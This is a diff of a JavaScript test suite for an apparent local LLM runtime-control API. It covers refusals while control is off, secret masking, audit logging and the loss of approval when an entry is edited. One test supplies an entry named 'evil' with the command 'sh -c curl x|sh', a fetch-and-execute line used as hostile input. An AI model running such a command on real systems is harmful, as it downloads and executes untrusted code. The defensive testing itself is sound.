@@ -29,15 +29,22 @@ const ROW = {
 };
 const err = (status, message, extra) => Object.assign(new Error(message), { status }, extra);
 
-function setup({ list = [ROW], stored = [QWEN], demo = null, act = {} } = {}) {
+function setup({ list = [ROW], stored = [QWEN], demo = null, act = {}, off = null, approvedFn = null, forgetThrows = false } = {}) {
   const calls = [];
   const forgot = [];
   const approvedIds = new Set();
   const saved = { value: stored };
+  const audits = [];
+  const logs = [];
   const control = {
     list: async () => list,
-    approved: (e) => approvedIds.has(e.id),
-    forget: (id) => forgot.push(id),
+    approved: (e) => (approvedFn ? approvedFn(e) : approvedIds.has(e.id)),
+    forget: (id) => {
+      forgot.push(id);
+      if (forgetThrows) throw new Error(`boom ${HOME}/x`);
+    },
+    offReason: () => off,
+    record: (action, id, extra) => audits.push({ action, id, ...extra }),
   };
   for (const a of ['start', 'stop', 'approve'])
     control[a] = async (target) => {
@@ -50,6 +57,7 @@ function setup({ list = [ROW], stored = [QWEN], demo = null, act = {} } = {}) {
     config: { list: () => saved.value, save: (v) => (saved.value = v) },
     demo,
     home: HOME,
+    log: (m) => logs.push(m),
   });
   const call = (method, path, body, contentType = 'application/json') =>
     api.route({
@@ -58,7 +66,7 @@ function setup({ list = [ROW], stored = [QWEN], demo = null, act = {} } = {}) {
       contentType,
       readBody: async () => (typeof body === 'string' ? body : JSON.stringify(body)),
     });
-  return { api, call, calls, forgot, saved, approvedIds };
+  return { api, call, calls, forgot, saved, approvedIds, audits, logs };
 }
 const noPath = (body) => assert.doesNotMatch(JSON.stringify(body), /\/Users\/|[A-Z]:\\\\/, JSON.stringify(body));
 
@@ -185,12 +193,12 @@ test('Settings: the entries with ~ for the home folder; save expands it, checks 
   const edit = await call('POST', '/api/runtimes/save', { was: 'qwen-local', entry: { ...QWEN, id: 'qwen' } });
   assert.equal(edit.status, 200);
   assert.deepEqual(saved.value.map((x) => x.id), ['qwen', 'mistral']);
-  assert.deepEqual(forgot, ['qwen-local']);
+  assert.deepEqual(forgot, ['mistral', 'qwen-local']);
   assert.equal((await call('POST', '/api/runtimes/save', { was: 'gone', entry: { ...QWEN, id: 'gone' } })).status, 404);
   const del = await call('POST', '/api/runtimes/delete', { id: 'mistral' });
   assert.equal(del.status, 200);
   assert.deepEqual(saved.value.map((x) => x.id), ['qwen']);
-  assert.deepEqual(forgot, ['qwen-local', 'mistral']);
+  assert.deepEqual(forgot, ['mistral', 'qwen-local', 'mistral']);
   assert.equal((await call('POST', '/api/runtimes/delete', { id: 'mistral' })).status, 404);
   // A hand-written entry that is not valid is listed with its reason.
   const handmade = setup({ stored: [{ id: 'x', command: 'llama-server -m x', port: 1 }] });
@@ -226,4 +234,124 @@ test('a start still in progress answers 409; odd ids and paths are handled', asy
   assert.equal((await call('GET', '/api/runtimes/constructor')).status, 404);
   assert.equal((await call('GET', '/api/runtimes/config')).body.entries[0].id, 'constructor');
   assert.equal((await call('POST', '/api/runtimes/save', { entry: { id: 'constructor', name: 'x' } })).status, 409);
+});
+
+const { commandHash } = require('../lib/runtimes/registry');
+const { OFF_TEXT } = require('../lib/runtimes/control');
+// A GitHub-token-like secret built at run time, with varied characters.
+const SECRET = 'ghp_' + Array.from({ length: 36 }, (_, i) => 'aZ3kQ9xLmN2pR7tVbW5yHc8DfG1jSe4uAiOl'[(i * 7) % 36]).join('');
+
+test('while control is off, save and delete are refused 403 and the config view hides the commands', async () => {
+  for (const why of ['server', 'docker']) {
+    const { call, saved, audits, forgot } = setup({ off: why });
+    const evil = { id: 'evil', name: 'Ollama', command: ['sh', '-c', 'curl x|sh'], port: 9 };
+    const s = await call('POST', '/api/runtimes/save', { entry: evil });
+    assert.equal(s.status, 403);
+    assert.equal(s.body.error, OFF_TEXT[why]);
+    const d = await call('POST', '/api/runtimes/delete', { id: 'qwen-local' });
+    assert.equal(d.status, 403);
+    assert.deepEqual(saved.value, [QWEN], 'config unchanged');
+    assert.deepEqual(forgot, []);
+    assert.deepEqual(audits.map((a) => [a.action, a.status, a.ok]), [['save', 403, false], ['delete', 403, false]]);
+    const v = (await call('GET', '/api/runtimes/config')).body;
+    assert.equal(v.off, OFF_TEXT[why]);
+    assert.equal(v.entries[0].id, 'qwen-local');
+    assert.equal(v.entries[0].command, null);
+    assert.doesNotMatch(JSON.stringify(v), /llama-server|qwen\.gguf/);
+  }
+  assert.equal((await setup().call('GET', '/api/runtimes/config')).body.off, null);
+});
+
+test('a rename onto a taken id (even an invalid entry) is refused 409', async () => {
+  const bad = { id: 'b', name: 'B', command: ['llama-server'], port: 0 };
+  const { call, saved } = setup({ stored: [QWEN, bad] });
+  const r = await call('POST', '/api/runtimes/save', { was: 'qwen-local', entry: { ...QWEN, id: 'b' } });
+  assert.equal(r.status, 409);
+  assert.match(r.body.error, /an entry with this id exists/);
+  assert.deepEqual(saved.value, [QWEN, bad]);
+});
+
+test('content-type follows the server rule', async () => {
+  const { call } = setup();
+  const ok = (ct) => call('POST', '/api/runtimes/start', { id: 'ollama' }, ct);
+  assert.equal((await ok('application/json; charset=utf-8')).status, 200);
+  assert.equal((await ok('Application/JSON')).status, 200);
+  assert.equal((await ok('application/json ;x=1')).status, 200);
+  assert.equal((await ok('application/jsonx')).status, 415);
+  assert.equal((await ok('')).status, 415);
+});
+
+test('secrets in arguments are masked in the view and survive an unchanged round trip', async () => {
+  const cmd = ['llama-server', '--api-key', SECRET, '--port', '8090'];
+  const { call, saved } = setup({ stored: [{ id: 'k', name: 'K', command: cmd, port: 8090 }] });
+  const v = (await call('GET', '/api/runtimes/config')).body.entries[0];
+  assert.doesNotMatch(JSON.stringify(v), new RegExp(SECRET));
+  assert.match(v.command[2], /hidden\u203a/);
+  const r = await call('POST', '/api/runtimes/save', { was: 'k', entry: { id: 'k', name: 'K2', command: v.command, port: 8090 } });
+  assert.equal(r.status, 200);
+  assert.deepEqual(saved.value[0].command, cmd, 'the stored secret is kept');
+  assert.doesNotMatch(JSON.stringify(r.body), new RegExp(SECRET));
+  // A changed argument is saved as sent.
+  const changed = await call('POST', '/api/runtimes/save', { was: 'k', entry: { id: 'k', name: 'K2', command: [...v.command.slice(0, 2), 'newsecret', '--port', '8090'], port: 8090 } });
+  assert.equal(changed.status, 200);
+  assert.equal(saved.value[0].command[2], 'newsecret');
+  // The placeholder is never written for a new entry, nor for a changed argument.
+  const before = JSON.stringify(saved.value);
+  const fresh = await call('POST', '/api/runtimes/save', { entry: { id: 'n', name: 'N', command: ['llama-server', '--api-key', v.command[2], '--port', '8091'], port: 8091 } });
+  assert.equal(fresh.status, 400);
+  assert.equal(JSON.stringify(saved.value), before);
+});
+
+test('a new entry forgets a stale approval first; a failing forget does not undo a saved change', async () => {
+  const { call, forgot, saved, logs, audits } = setup({ forgetThrows: true });
+  const r = await call('POST', '/api/runtimes/save', { entry: { id: 'mistral', name: 'M', command: ['llama-server', '--port', '8082'], port: 8082 } });
+  assert.equal(r.status, 200);
+  assert.deepEqual(forgot, ['mistral']);
+  assert.equal(saved.value.length, 2);
+  assert.equal(logs.length, 1);
+  assert.doesNotMatch(logs.join(), /\/Users\//);
+  const rename = await call('POST', '/api/runtimes/save', { was: 'mistral', entry: { id: 'm2', name: 'M', command: ['llama-server', '--port', '8082'], port: 8082 } });
+  assert.equal(rename.status, 200);
+  const del = await call('POST', '/api/runtimes/delete', { id: 'm2' });
+  assert.equal(del.status, 200);
+  assert.deepEqual(audits.map((a) => [a.action, a.id, a.status]), [['save', 'mistral', 200], ['save', 'm2', 200], ['delete', 'm2', 200]]);
+});
+
+test('save and delete are audited with id and status and never carry the command; save never approves', async () => {
+  const { call, audits, calls } = setup();
+  await call('POST', '/api/runtimes/save', { entry: { id: 'mistral', name: 'M', command: ['llama-server', '--api-key', 'topsecret', '--port', '8082'], port: 8082 } });
+  await call('POST', '/api/runtimes/save', { entry: { ...QWEN } }); // 409
+  await call('POST', '/api/runtimes/save', { entry: { id: 'x', command: 'nope' } }); // 400
+  await call('POST', '/api/runtimes/delete', { id: 'gone' }); // 404
+  await call('POST', '/api/runtimes/delete', { id: 'mistral' });
+  assert.deepEqual(audits.map((a) => [a.action, a.id, a.status, a.ok]), [
+    ['save', 'mistral', 200, true],
+    ['save', 'qwen-local', 409, false],
+    ['save', 'x', 400, false],
+    ['delete', 'gone', 404, false],
+    ['delete', 'mistral', 200, true],
+  ]);
+  assert.doesNotMatch(JSON.stringify(audits), /topsecret|llama-server/);
+  assert.deepEqual(calls, [], 'save and edit never approve');
+});
+
+test('an edit drops the approval because the hash covers the whole entry; a bad was; ~ only at the start', async () => {
+  const hashes = new Set([commandHash(QWEN.command)]);
+  const { call, saved } = setup({ approvedFn: (e) => hashes.has(commandHash(e.command)) });
+  const view = async () => (await call('GET', '/api/runtimes/config')).body.entries[0];
+  assert.equal((await view()).approved, true);
+  const edit = await call('POST', '/api/runtimes/save', {
+    was: 'qwen-local',
+    entry: { ...QWEN, command: ['llama-server', '-m', '~/models/qwen.gguf', '--port', '8081', '--ctx-size', '4096'] },
+  });
+  assert.equal(edit.status, 200);
+  assert.equal(edit.body.entries[0].approved, false, 'an edited command asks again');
+  assert.equal((await call('POST', '/api/runtimes/save', { was: 'Bad Id!', entry: QWEN })).status, 400);
+  assert.equal((await call('POST', '/api/runtimes/save', { was: 5, entry: QWEN })).status, 400);
+  const tilde = await call('POST', '/api/runtimes/save', {
+    was: 'qwen-local',
+    entry: { ...QWEN, command: ['llama-server', '--root=~/x', 'a~b', '~', '~/m.gguf', '--port', '8081'] },
+  });
+  assert.equal(tilde.status, 200);
+  assert.deepEqual(saved.value[0].command, ['llama-server', '--root=~/x', 'a~b', '~', `${HOME}/m.gguf`, '--port', '8081']);
 });
